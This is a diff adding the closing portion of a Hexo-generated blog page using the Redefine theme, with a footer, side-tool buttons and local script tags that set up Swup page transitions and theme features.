+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Linz</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        5 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
